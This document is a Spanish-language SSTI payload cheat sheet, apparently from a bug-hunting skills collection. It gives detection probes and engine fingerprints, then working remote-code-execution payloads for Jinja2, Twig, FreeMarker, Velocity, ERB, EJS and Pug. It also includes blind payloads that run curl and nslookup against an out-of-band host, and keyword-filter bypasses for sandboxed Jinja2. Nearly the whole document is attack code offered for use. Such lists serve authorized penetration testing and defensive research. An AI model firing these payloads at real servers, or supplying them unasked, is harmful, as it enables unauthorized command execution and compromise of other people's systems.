# SSTI Payloads

> Ver `skills/hunt/ssti`. Detección primero (evaluación matemática visible),
> identificación de motor después, RCE al final.

## Detección (polyglots y básicos)

```
{{7*7}}            -- Jinja2/Twig → 49
${7*7}             -- FreeMarker/Velocity/Spring → 49
<%= 7*7 %>         -- ERB/EJS/JSP → 49
#{7*7}             -- Ruby/Thymeleaf/Pug
*{7*7}             -- Thymeleaf
{{7*'7'}}          -- Jinja2 → '7777777'; Twig → 49  (distingue motores)
{{7*7}}${7*7}<%= 7*7 %>#{7*7}   -- polyglot de detección
{{= 7*7 }}         -- algunos motores con = dentro
```

## Identificación de motor

```
{{config}}                    -- Jinja2 (Flask): vuelca config si es vulnerable
{{self}}                      -- Jinja2
{{_self.env}}                 -- Twig
${.data_model}                -- FreeMarker
{{#with "s" as |x|}}{{x}}{{/with}}   -- Handlebars
```

## RCE por motor

```
-- Jinja2 (Flask):
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}}   -- buscar subprocess.Popen por índice

-- Twig:
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

-- FreeMarker:
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}

-- Velocity:
#set($x=$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id"))

-- ERB (Ruby):
<%= system('id') %>
<%= `id` %>

-- EJS (Node):
<%= global.process.mainModule.require('child_process').execSync('id') %>

-- Pug/Jade (Node):
#{global.process.mainModule.require('child_process').execSync('id')}
```

## Blind SSTI (sin output reflejado)

```
{{config.__class__.__init__.__globals__['os'].popen('curl https://{TOKEN}.oast.host').read()}}
<%= `nslookup {TOKEN}.oast.host` %>
-- Confirmar vía OAST (skills/core/oob-interactions).
```

## Sandboxed / filtrado (Jinja2 sin __class__ directo)

```
{{request|attr('application')}}
{{request.args.x}}            -- filtra __globals__ → usar attr() o filtros
{{['__cl'~'ass__']|join}}     -- concat para filtros de keywords
{{x.__init__.__globals__}}    -- si solo bloquean "config"
```

## Gotchas de uso

- Resultado matemático visible (49) = SSTI confirmado; RCE es el siguiente
  paso y requiere identificar el motor — no disparar payloads de RCE a ciegas.
- `{{7*'7'}}` es la prueba discriminadora Jinja2 vs Twig más rápida.
- Errores del motor (stacktrace con nombres de templates) también identifican
  motor aunque no evalúen — registrar como fingerprint, seguir probando.
